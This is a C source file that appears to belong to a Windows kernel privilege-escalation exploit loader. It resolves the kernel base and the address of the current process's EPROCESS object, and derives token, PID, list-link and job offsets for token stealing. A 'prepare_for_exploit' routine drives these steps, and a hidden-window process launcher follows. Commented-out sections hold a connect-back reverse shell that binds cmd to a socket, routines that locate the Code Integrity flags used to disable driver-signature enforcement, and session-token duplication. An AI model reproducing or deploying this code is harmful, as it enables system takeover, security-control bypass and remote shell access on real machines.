#include <windows.h>
#include <winsock2.h>
#include <wtsapi32.h>

#include "loader.h"

typedef LONG NTSTATUS;

#pragma pack(1)


/* crt */
VOID __LMEMSET__( LPVOID p,  int cValue,  size_t dwSize);
LPVOID __LMEMCPY__( LPVOID lpDst, LPVOID lpSrc, 	DWORD dwCount);
int __LMEMCMP__(unsigned char *s1, unsigned char *s2, size_t n);
CHAR * __LSTRCAT__(CHAR *s1, CHAR *s2);
CHAR * __LSTRRCHR__(CHAR *s,  INT c);
INT __STRICMP__(CHAR *s1, CHAR *s2);
void * __LMEMCHR__(unsigned char *s, int c, size_t n);
VOID __LSTRCPY__(CHAR dest[], CHAR source[]);
UINT __LSTRLEN(CHAR *str);

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_HANDLE
{
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG HandleCount; /* Or NumberOfHandles if you prefer. */
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
		);

typedef struct {
	PVOID   Unknown1;
	PVOID   Unknown2;
	PVOID   Base;
	ULONG   Size;
	ULONG   Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

//unsigned int kproc = 0;

#include <stdio.h>

//size_t gDta_size;
//unsigned char *gDta;
//PIMAGE_DOS_HEADER gMZDta;
//PIMAGE_NT_HEADERS32 gPEDta;
//PIMAGE_NT_HEADERS64 gPEPDta;

void * map_va (PVTABLE lpTable, unsigned int va)
{
	PIMAGE_SECTION_HEADER sec;
	unsigned int sec_cnt,i;
	char *dptr;

	if (lpTable->locals->gPEDta)
	{
		sec_cnt = lpTable->locals->gPEDta->FileHeader.NumberOfSections;
		sec = IMAGE_FIRST_SECTION(lpTable->locals->gPEDta);
	}
	else
	{
		sec_cnt = lpTable->locals->gPEPDta->FileHeader.NumberOfSections;
		sec = IMAGE_FIRST_SECTION(lpTable->locals->gPEPDta);
	}
	for (i = 0;i < sec_cnt;i++)
	{
		if (va >= sec[i].VirtualAddress && va < (sec[i].VirtualAddress+sec[i].Misc.VirtualSize))
		{
			dptr = (char *) &lpTable->locals->gDta[va-sec[i].VirtualAddress+sec[i].PointerToRawData];
			return (void *)dptr;
		}
	}
	return NULL;
}

//unsigned int ImageBase;

unsigned int do_export_read (PVTABLE lpTable, char *exportname, char *dest, int size)
{
	unsigned int i;
	PIMAGE_EXPORT_DIRECTORY exp_dir;
	unsigned int *functions;
	unsigned short *ordinals;
	unsigned int *name;
	unsigned int va_exp = lpTable->locals->gPEPDta->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	unsigned int sz_exp = lpTable->locals->gPEPDta->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	lpTable->locals->ImageBase = lpTable->locals->gPEPDta->OptionalHeader.ImageBase;

	if (va_exp == 0 || sz_exp == 0)
		return 0;
	exp_dir = (PIMAGE_EXPORT_DIRECTORY) map_va (lpTable, va_exp);
	functions = (unsigned int *) map_va (lpTable, (unsigned int)exp_dir->AddressOfFunctions);
	ordinals = (unsigned short *) map_va (lpTable, (unsigned int)exp_dir->AddressOfNameOrdinals);
	name = (unsigned int *) map_va (lpTable, (unsigned int)exp_dir->AddressOfNames);

	for (i = 0;i < exp_dir->NumberOfFunctions;i++)
	{
		unsigned int entryPointRVA = functions[i];
		unsigned int j;
		char *fname;
		fname = NULL;
		if (!entryPointRVA)
			continue;
		for (j = 0;j < exp_dir->NumberOfNames;j++)
			if (ordinals[j]==i)
				fname = (char *) map_va (lpTable, name[j]);

		if (!fname)
			continue;

		if (strcmp(fname, exportname))
			continue;
		if (dest)
			__LMEMCPY__(dest, map_va(lpTable, entryPointRVA), size);
		return entryPointRVA;
	}
	return 0;
}



int getexport(PVTABLE lpTable, char *file, char *exportname, char *dest, int size)
{
	int ret = 0;
	FILE *fp = fopen (file, "rb");

	fseek (fp, 0, SEEK_END);
	lpTable->locals->gDta_size = (size_t) ftell (fp);
	if (lpTable->locals->gDta_size > 0) {
		fseek (fp,0,SEEK_SET);
		lpTable->locals->gDta = (unsigned char *) malloc (lpTable->locals->gDta_size + 1);
		if (lpTable->locals->gDta)
		{
			if (fread (lpTable->locals->gDta, lpTable->locals->gDta_size, 1, fp) != 1)
			{
				free (lpTable->locals->gDta);
				lpTable->locals->gDta = NULL;
			}
			else
				lpTable->locals->gDta[lpTable->locals->gDta_size] = 0;
		}
	}
	fclose (fp);
	lpTable->locals->gMZDta = (PIMAGE_DOS_HEADER) lpTable->locals->gDta;
	lpTable->locals->gPEDta = (PIMAGE_NT_HEADERS32) &lpTable->locals->gDta[lpTable->locals->gMZDta->e_lfanew];
	lpTable->locals->gPEPDta = (PIMAGE_NT_HEADERS64) lpTable->locals->gPEDta;

	ret = do_export_read(lpTable, exportname, dest, size);

	free(lpTable->locals->gDta);
	lpTable->locals->gDta = NULL;
	return ret;
}

//typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
//LPFN_ISWOW64PROCESS fnIsWow64Process;
//BOOL bIsWow64 = 0;

void IsWow64(PVTABLE lpTable)
{

	//IsWow64Process is not available on all supported versions of Windows.
	//Use GetModuleHandle to get a handle to the DLL that contains the function
	//and GetProcAddress to get a pointer to the function if available.

	// TODO: remove getprocaddress
	lpTable->fpIsWow64Process = (ISWOW64PROCESS)  lpTable->GetProcAddress(lpTable->fpGetModuleHandleA(lpTable->lpLoaderConfig->strKernel32), lpTable->lpLoaderConfig->strIsWow64Process);

	if(NULL != lpTable->fpIsWow64Process)
	{
		if (!lpTable->fpIsWow64Process(lpTable->fpGetCurrentProcess(),&lpTable->locals->bIsWow64))
		{
			lpTable->locals->bIsWow64 = 0;
		}
	}
}

/*
FARPROC getkaddr(HMODULE UserKernBase, PVOID RealKernelBase, LPCSTR SymName) {
	PUCHAR KernBaseTemp     = (PUCHAR)UserKernBase;
	PUCHAR RealKernBaseTemp = (PUCHAR)RealKernelBase;
	PUCHAR temp = (PUCHAR)GetProcAddress(UserKernBase, SymName);

	return (FARPROC)(temp - KernBaseTemp + RealKernBaseTemp);
}*/

//HMODULE NTosHandle;

//char tmpbuf[256];
//char cipath[256];

//PVOID kBase=NULL;
//PVOID ciBase=NULL;


void getkprocess(PVTABLE lpTable) {
	CHAR kFullName[256];
	char buf[16];
	LPSTR kName;
	_NtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION pmodinf;
	PSYSTEM_HANDLE_INFORMATION phaninf;
	ULONG len;
	HMODULE ntdllh;
	int i;
	HANDLE curproc;
	unsigned int curprocid = lpTable->fpGetCurrentProcessId();
	HANDLE hProcessHeap = lpTable->fpGetProcessHeap();

	IsWow64(lpTable);

	ntdllh = lpTable->fpGetModuleHandleA(lpTable->lpLoaderConfig->strNtDll);

	NtQuerySystemInformation =  (_NtQuerySystemInformation)lpTable->GetProcAddress(ntdllh,lpTable->lpLoaderConfig->strNtquerysysteminformation);

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);


	pmodinf = (PSYSTEM_MODULE_INFORMATION)lpTable->fpHeapAlloc(hProcessHeap, 0x00000008,len);
	NtQuerySystemInformation(SystemModuleInformation, pmodinf, len, &len);

	__LMEMSET__(kFullName, 0x00, sizeof(kFullName));
	__LSTRCPY__(kFullName, pmodinf->Module[0].ImageName);


	lpTable->locals->kBase = pmodinf->Module[0].Base;

	kName = __LSTRRCHR__(kFullName, lpTable->lpLoaderConfig->strSlash);

	if (lpTable->locals->bIsWow64) {
		for (i = 0; i < pmodinf->Count; i++)
			if (__STRICMP__(pmodinf->Module[i].ImageName , lpTable->lpLoaderConfig->strSystemRootCI) == 0 )
				break;
	
		if (i != pmodinf->Count) {
			lpTable->locals->ciBase = pmodinf->Module[i].Base;
		}
	}
	
	if (!lpTable->locals->bIsWow64) {
		lpTable->locals->NTosHandle = lpTable->LoadLibraryA(++kName);
	} else {
		lpTable->fpGetWindowsDirectoryA(lpTable->locals->tmpbuf, sizeof(lpTable->locals->tmpbuf));
		
		__LSTRCAT__(lpTable->locals->tmpbuf, lpTable->lpLoaderConfig->strSysnative);
		__LSTRCAT__(lpTable->locals->tmpbuf, kName);

		lpTable->fpGetWindowsDirectoryA(lpTable->locals->cipath, sizeof(lpTable->locals->cipath));
		__LSTRCAT__(lpTable->locals->cipath, lpTable->lpLoaderConfig->strSystenativeCI);
	}

	phaninf = (PSYSTEM_HANDLE_INFORMATION)lpTable->fpHeapAlloc(hProcessHeap, 0x00000008,4096*16*16);

	len = 4096*16*16;

	lpTable->fpDuplicateHandle(lpTable->fpGetCurrentProcess(), lpTable->fpGetCurrentProcess(), lpTable->fpGetCurrentProcess(), &curproc, 0, FALSE, 0);

	NtQuerySystemInformation(SystemHandleInformation, phaninf, len, &len);

	for (i = 0; i < phaninf->HandleCount; i++)
		if (phaninf->Handles[i].ProcessId == curprocid)
			if (phaninf->Handles[i].Handle == (unsigned short)((unsigned int)curproc)) {
				lpTable->locals->kproc = (unsigned int)phaninf->Handles[i].Object;
				break;
			}

}



//unsigned int eprocess_offset;
//unsigned int flink_offset;
//unsigned int pid_offset;
//unsigned int token_offset;
//unsigned int job_offset;

//heuristic
//TODO: fix strings pi
void findoffsets(PVTABLE lpTable) {
	unsigned char *procfunc;
	unsigned char *pidfunc;
	unsigned char *tokenfunc;
	unsigned char *jobfunc;


	procfunc = (void*)lpTable->GetProcAddress(lpTable->locals->NTosHandle, "PsGetCurrentProcess");

	procfunc = __LMEMCHR__(procfunc, 0xC3, 0x100);

	procfunc--;

	if (*procfunc == 0)
		lpTable->locals->eprocess_offset = *(unsigned int*)(procfunc-3);
	else
		lpTable->locals->eprocess_offset = *procfunc;


	pidfunc = (void*)lpTable->GetProcAddress(lpTable->locals->NTosHandle, "PsGetProcessId");

	pidfunc = __LMEMCHR__(pidfunc, 0xC2, 0x100);

	pidfunc-=2;

	if (*pidfunc == 0)
		lpTable->locals->pid_offset = *(unsigned int*)(pidfunc-3);
	else
		lpTable->locals->pid_offset = *pidfunc;

	//fixed
	lpTable->locals->flink_offset = lpTable->locals->pid_offset+4;


	tokenfunc = (void*)lpTable->GetProcAddress(lpTable->locals->NTosHandle, "PsReferencePrimaryToken");

	tokenfunc = __LMEMCHR__(tokenfunc, 0x8D, 0x100);

	tokenfunc++;

	if ((tokenfunc[1] == 0x0) || (tokenfunc[1] == 0x1))
		lpTable->locals->token_offset = *(unsigned int*)tokenfunc;
	else
		lpTable->locals->token_offset= tokenfunc[1];

	jobfunc = (void*)lpTable->GetProcAddress(lpTable->locals->NTosHandle, "PsGetProcessJob");
	jobfunc = __LMEMCHR__(jobfunc, 0x5D, 0x100);
	jobfunc -= 4;

	lpTable->locals->job_offset = *(unsigned int*)jobfunc;


}

unsigned int get_va(PVTABLE lpTable, unsigned int offset) {
	PIMAGE_SECTION_HEADER sec;
	unsigned int sec_cnt,i;
	unsigned int dptr;

	sec_cnt = lpTable->locals->gPEPDta->FileHeader.NumberOfSections;
	sec = IMAGE_FIRST_SECTION(lpTable->locals->gPEPDta);

	for (i = 0;i < sec_cnt;i++)
	{
		if (offset >= sec[i].PointerToRawData && offset < (sec[i].PointerToRawData+sec[i].SizeOfRawData))
		{
			dptr = offset-sec[i].PointerToRawData+sec[i].VirtualAddress;
			return dptr;
		}
	}
	return 0;
}

//unsigned int g_CiEnabled = 0;
//unsigned int g_CiOptions = 0;

/*
void getcioptions(PVTABLE lpTable)
{
	int ret = 0;
	int i;
	unsigned char *buf, *p, *pstart = 0;
	int found = 0;
	unsigned int bufsiz;
	unsigned char SeValidateSig[] = { 0x48, 0x83, 0xEC, 0x38, 0x80 };
	unsigned char fbuf[256];
	unsigned int offset;
	unsigned char *export;
	
	FILE *fp = fopen (lpTable->locals->cipath, "rb");
	
	fseek (fp, 0, SEEK_END);
	bufsiz = (size_t) ftell (fp);
	
	if (bufsiz > 0) {
		
		fseek (fp,0,SEEK_SET);
		buf = (unsigned char *) malloc (bufsiz);
		
		if (buf)
			if (fread (buf, bufsiz, 1, fp) != 1)
				free (buf);
	}

	fclose (fp);

	lpTable->locals->gDta = buf;
	
	lpTable->locals->gMZDta = (PIMAGE_DOS_HEADER) lpTable->locals->gDta;
	lpTable->locals->gPEDta = (PIMAGE_NT_HEADERS32) &lpTable->locals->gDta[lpTable->locals->gMZDta->e_lfanew];
	lpTable->locals->gPEPDta = (PIMAGE_NT_HEADERS64) lpTable->locals->gPEDta;

	__LMEMSET__(fbuf, 0, sizeof(fbuf));
	
	export = map_va(lpTable, do_export_read(lpTable, "CiInitialize", fbuf, sizeof(fbuf)));
	
	for (i = 0; i < sizeof(fbuf); i++)
		if (fbuf[i] == 0xE9)
			if ((fbuf[i+5] == 0xCC)  || (fbuf[i+5] == 0x90))
				break;
		
	if (i == sizeof(fbuf))
		return;
	
	offset = *(unsigned int*)(fbuf+i+1);
	offset += 5;
	
	p = export+i+offset;
	
	offset = *(unsigned int*)(p);
	
	for (i = 0; i < 0x100; i++)
		if (*(unsigned short*)(p+i) == 0x8948)
			if (p[i+2] == 0x5)
				if (*(unsigned short*)(p+i+7) == 0x0D89)
					break;

	if (i == 0x100)
		return;
	
	offset =  *(unsigned int*)(p+i+9);
	offset += get_va(lpTable, p+i+13-buf) + (unsigned int)lpTable->locals->ciBase;

	lpTable->locals->g_CiOptions = offset;


	free(buf);
	return;
}

void getcienabled(PVTABLE lpTable)
{
	int ret = 0;
	unsigned char *buf, *p, *pstart = 0;
	int found = 0;
	unsigned int bufsiz;
	unsigned char SeValidateSig[] = { 0x48, 0x83, 0xEC, 0x38, 0x80 };
	
	FILE *fp = fopen (lpTable->locals->tmpbuf, "rb");
	
	fseek (fp, 0, SEEK_END);
	bufsiz = (size_t) ftell (fp);
	
	if (bufsiz > 0) {
		
		fseek (fp,0,SEEK_SET);
		buf = (unsigned char *) malloc (bufsiz);
		
		if (buf)
			if (fread (buf, bufsiz, 1, fp) != 1)
				free (buf);
	}

	fclose (fp);

	p = buf;
	
	for (p = buf; p < buf + bufsiz; p++) {
		if (!__LMEMCMP__(p, SeValidateSig, 5)) {
			int i;
			pstart = p;
			p+=5;
			for (i = 0; i < 256; i++, p++)
				if (*(unsigned int*)p == 0xC0000428) {
					found = 1;
					break;
				}
				
			p = pstart;
		}
		if (found)
			break;
	}

	if (found) {
		unsigned int offset = *(unsigned int*)(pstart+6);
		
//one line crash fix - used to occur due to gDta pointing to freed data
		lpTable->locals->gDta = buf;
		
		lpTable->locals->gMZDta = (PIMAGE_DOS_HEADER) lpTable->locals->gDta;
		lpTable->locals->gPEDta = (PIMAGE_NT_HEADERS32) &lpTable->locals->gDta[lpTable->locals->gMZDta->e_lfanew];
		lpTable->locals->gPEPDta = (PIMAGE_NT_HEADERS64) lpTable->locals->gPEDta;

		offset += get_va(lpTable,pstart+11-buf) + (unsigned int)lpTable->locals->kBase;
		lpTable->locals->g_CiEnabled = offset;
	}

	
	free(buf);
	return;
}
*/

void findoffsets64(PVTABLE lpTable) {
	unsigned char *procfunc;
	unsigned char *pidfunc;
	unsigned char *tokenfunc;
	unsigned char *jobfunc;
	unsigned char buf[1024];


	//lpTable->locals->eprocess_offset;
	// 6.1
	/*lpTable->locals->pid_offset = 0x180;
	lpTable->locals->token_offset = 0x208 ;
	lpTable->locals->flink_offset = lpTable->locals->pid_offset+8;
	lpTable->locals->job_offset = 0x260;*/


	// 6.2
	lpTable->locals->pid_offset = 0x2e0;
	lpTable->locals->token_offset = 0x348;
	lpTable->locals->flink_offset = lpTable->locals->pid_offset + 8;
	lpTable->locals->job_offset = 0x3a0;

	/*
	__LMEMSET__(buf, 0, sizeof(buf));
	getexport(lpTable, lpTable->locals->tmpbuf, "PsGetCurrentProcess", buf, sizeof(buf));

	procfunc = __LMEMCHR__(buf, 0xC3, 0x100);

	procfunc--;

	if (*procfunc == 0)
		lpTable->locals->eprocess_offset = *(unsigned int*)(procfunc-3);
	else
		lpTable->locals->eprocess_offset = *procfunc;


	__LMEMSET__(buf, 0, sizeof(buf));
	getexport(lpTable, lpTable->locals->tmpbuf, "PsGetProcessId", buf, sizeof(buf));

	pidfunc = __LMEMCHR__(buf, 0xC3, 0x100);

	pidfunc--;

	if (*pidfunc == 0)
		lpTable->locals->pid_offset = *(unsigned int*)(pidfunc-3);
	else
		lpTable->locals->pid_offset = *pidfunc;

	//fixed
	lpTable->locals->flink_offset = lpTable->locals->pid_offset+8;

	__LMEMSET__(buf, 0, sizeof(buf));
	getexport(lpTable, lpTable->locals->tmpbuf, "PsReferencePrimaryToken", buf, sizeof(buf));

	tokenfunc = buf;
	for (;;) {
		tokenfunc = __LMEMCHR__(tokenfunc, 0x00, 0x100);
		if (tokenfunc[1] == 0)
			break;
	}

	lpTable->locals->token_offset = *(unsigned int*)(tokenfunc-2);

	
	__LMEMSET__(buf, 0, sizeof(buf));
	getexport(lpTable, lpTable->locals->tmpbuf, "PsGetProcessJob", buf, sizeof(buf));

	jobfunc = __LMEMCHR__(buf, 0xC3, 0x100);
	jobfunc -= 4;

	lpTable->locals->job_offset = *(unsigned int*)jobfunc;

	/*
	getcienabled(lpTable);
	
	if (lpTable->locals->g_CiEnabled == 0)
		getcioptions(lpTable);
	*/

	//printf("[*] token_offset: %p\n", lpTable->locals->token_offset);
	//printf("[*] pid_offset: %p\n", lpTable->locals->pid_offset);
	//printf("[*] job_offset: %p\n", lpTable->locals->job_offset);
	
}

void prepare_for_exploit(PVTABLE lpTable) {

	getkprocess(lpTable);

	if (!lpTable->locals->bIsWow64)
		findoffsets(lpTable);
	else
		findoffsets64(lpTable);

}


typedef DWORD (WINAPI *_CreateProcessInternal)(
		DWORD unknown1,                              // always (?) NULL
		LPCTSTR lpApplicationName,
		LPTSTR lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL bInheritHandles,
		DWORD dwCreationFlags,
		LPVOID lpEnvironment,
		LPCTSTR lpCurrentDirectory,
		LPSTARTUPINFO lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation,
		DWORD unknown2                               // always (?) NULL
		);
/*
HWND mywindow;
		
BOOL CALLBACK enumproc(HWND hwnd, LPARAM lparam) {
	char tmp[1024];
	DWORD pid;
	
	GetWindowThreadProcessId(hwnd,&pid);
	
	if (pid == lparam) {
		memset(tmp, 0, sizeof(tmp));
		GetWindowText(hwnd, tmp, sizeof(tmp));
		if (strstr(tmp, ".pdf")) {
			mywindow = hwnd;
			return FALSE;
		}
	}
	
	return TRUE;
}
*/

/*
void writeEXE(unsigned char *path, unsigned char *buf, unsigned int size) {
	HANDLE file;
	int tmp;
	
	file = CreateFile(path, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (!file)
		return;
	
	WriteFile(file, buf, size, &tmp, NULL);
	
	CloseHandle(file);
}
*/

/*
int amisystem(void) {
	HANDLE ht;
	TOKEN_USER* ptu;
	int needed;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &ht);

	ptu = (TOKEN_USER *) malloc(2048);

	GetTokenInformation(ht, TokenUser, ptu, 2048, &needed);

	return IsWellKnownSid(ptu->User.Sid, WinLocalSystemSid);
}
*/

unsigned int execstarter(PVTABLE lpTable, char *prog) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	unsigned int existingtoken;
	unsigned int newtoken;
	_CreateProcessInternal CreateProcessInternal;

	CreateProcessInternal =  (_CreateProcessInternal)lpTable->GetProcAddress(lpTable->fpGetModuleHandleA(lpTable->lpLoaderConfig->strKernel32), lpTable->lpLoaderConfig->strProcessInternal);
	
	__LMEMSET__(&pi,0,sizeof(pi));
	__LMEMSET__(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = 1;
	si.wShowWindow = SW_HIDE;
	
	si.lpDesktop = lpTable->lpLoaderConfig->strWinSta0;

	CreateProcessInternal(0,NULL,prog,NULL,NULL,0,0,NULL,NULL,&si,&pi,0);	

	lpTable->fpWaitForSingleObject(pi.hProcess, INFINITE);
	return pi.dwProcessId;
}


/*unsigned int execstarter(PVTABLE lpTable, char *prog) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	unsigned int existingtoken;
	unsigned int newtoken;
	_CreateProcessInternal CreateProcessInternal;

	CreateProcessInternal =  (_CreateProcessInternal)lpTable->GetProcAddress(lpTable->fpGetModuleHandleA(lpTable->lpLoaderConfig->strKernel32), lpTable->lpLoaderConfig->strProcessInternal);
	
	__LMEMSET__(&pi,0,sizeof(pi));
	__LMEMSET__(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = 1;
	si.wShowWindow = SW_HIDE;
	
	si.lpDesktop =   "WinSta0\\Default";//lpTable->lpLoaderConfig->strWinSta0;

	CreateProcessInternal(0,NULL,prog,NULL,NULL,0,0,NULL,NULL,&si,&pi,0);	

	WaitForSingleObject(pi.hProcess, INFINITE);
	return pi.dwProcessId;
}*/

/*
unsigned int executeprogram(char *prog) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	unsigned int existingtoken;
	unsigned int newtoken;
	_CreateProcessInternal CreateProcessInternal;

	CreateProcessInternal =  (_CreateProcessInternal)GetProcAddress(GetModuleHandle("kernel32"), "CreateProcessInternalA");
	
	__LMEMSET__(&pi,0,sizeof(pi));
	__LMEMSET__(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = 1;
	si.wShowWindow = 5;
	
	si.lpDesktop = "WinSta0\\Default";

	if (amisystem()) {
		WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &existingtoken);
		DuplicateTokenEx((void*)existingtoken,0x2000000,0,1,1,&newtoken);
		CreateProcessInternal(newtoken,NULL,prog,NULL,NULL,0,0,NULL,NULL,&si,&pi,0);
	}
	else
		CreateProcessInternal(0,NULL,prog,NULL,NULL,0,0,NULL,NULL,&si,&pi,0);	

	return pi.dwProcessId;
}*/

/*
void connectback(char *ip, unsigned short port) {
	WSADATA wsaData;
	SOCKET hSocket;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	struct sockaddr_in sin;
	_CreateProcessInternal CreateProcessInternal;

	CreateProcessInternal =  (_CreateProcessInternal)GetProcAddress(GetModuleHandle("kernel32"), "CreateProcessInternalA");

	memset(&sin,0,sizeof(sin));
	memset(&si,0,sizeof(si));
	WSAStartup(MAKEWORD(2,0),&wsaData);
	hSocket = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,0);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = inet_addr(ip);

	connect(hSocket,(struct sockaddr*)&sin,sizeof(sin));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = si.hStdOutput = si.hStdError = (void *)hSocket;
	CreateProcessInternal(0,NULL,"cmd",NULL,NULL,1,0,NULL,NULL,&si,&pi,0);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}
*/


#pragma optimize(off) 
int __LMEMCMP__(unsigned char *s1, unsigned char *s2, size_t n)
{
	unsigned char u1, u2;

	for ( ; n-- ; s1++, s2++) {
		u1 = * (unsigned char *) s1;
		u2 = * (unsigned char *) s2;
		if ( u1 != u2) {
			return (u1-u2);
		}
	}

	return 0;
}

VOID __LSTRCPY__(CHAR dest[], CHAR source[]) {
	int i = 0;
	while (1) {
      dest[i] = source[i];
      if (dest[i] == '\0') break;
      i++;
	} 
}

CHAR * __LSTRRCHR__(CHAR *s,  INT c) {
  char *rtnval = 0;

  do {
    if (*s == c)
      rtnval = (char*) s;
  } while (*s++);
  return (rtnval);
}

VOID __LMEMSET__( LPVOID p, int cValue,  size_t dwSize)
{
	for (UINT i=0; i<dwSize; i++)
		((PCHAR)p)[i] = cValue;
}

UINT __LSTRLEN(CHAR *str){
	CHAR *s;

	for (s = str; *s; ++s);
	return(s - str);
}

CHAR * __LSTRCAT__(CHAR *s1, CHAR *s2)
{
    __LSTRCPY__(&s1[__LSTRLEN(s1)], s2);
    return s1;
}

INT __TOLOWER__(INT chr)
{
    return (chr >='A' && chr<='Z') ? (chr + 32) : (chr);    
}

INT __STRICMP__(CHAR *s1, CHAR *s2) {
   if (s1 == NULL) return s2 == NULL ? 0 : -(*s2);
   if (s2 == NULL) return *s1;

   char c1, c2;
   while ((c1 = __TOLOWER__ (*s1)) == (c2 = __TOLOWER__ (*s2)))
   {
     if (*s1 == '\0') break;
     ++s1; ++s2;
   }

   return c1 - c2;
}

LPVOID __LMEMCPY__( LPVOID lpDst, LPVOID lpSrc, 	DWORD dwCount){
	LPBYTE s = (LPBYTE) lpSrc;
	LPBYTE d = (LPBYTE) lpDst;

	while (dwCount--)
		*d++ = *s++;

	return lpDst;
}

void * __LMEMCHR__(unsigned char *s, int c, size_t n)
{
	if (n != 0) {
		unsigned char *p = s;

		do {
			if (*p++ == c)
				return ((void *)(p - 1));
		} while (--n != 0);
	}
	return (NULL);
}

#pragma optimize(on) 